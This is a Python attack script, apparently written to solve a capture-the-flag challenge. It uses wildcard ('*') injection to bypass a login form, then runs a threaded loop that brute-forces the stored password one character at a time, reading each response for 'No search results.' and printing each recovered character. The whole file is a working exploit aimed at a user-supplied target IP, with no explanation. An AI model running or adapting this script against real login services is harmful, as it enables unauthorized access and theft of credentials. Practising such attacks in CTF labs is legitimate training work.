import requests
import string
import concurrent.futures

ip_address = input("Enter target IP: ")

proxies = {"http": "http://127.0.0.1:8080"}
password = ""

data = {"username": "*", "password": "*"}
response = requests.post(ip_address + "/login", data=data, proxies=proxies, allow_redirects=True)

if "No search results." in response.text:
    print("[+] Successfully logged in")

print("[?] Trying to extract flag")

letters_and_digits = string.ascii_letters + string.digits + string.punctuation

def test_character(character):
    """Function to test a single character in a password attempt."""
    test_password = password + character + "*"
    data = {"username": "*", "password": test_password}
    response = requests.post(ip_address + "/login", data=data, proxies=proxies, allow_redirects=True)
    
    if "No search results." in response.text and character != "*":
        return character
    return None

found = True

while found:
    found = False
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_char = {executor.submit(test_character, char): char for char in letters_and_digits}
        for future in concurrent.futures.as_completed(future_to_char):
            result = future.result()
            if result:
                password += result
                print(f"[+] Found character: {password}")
                found = True
                break
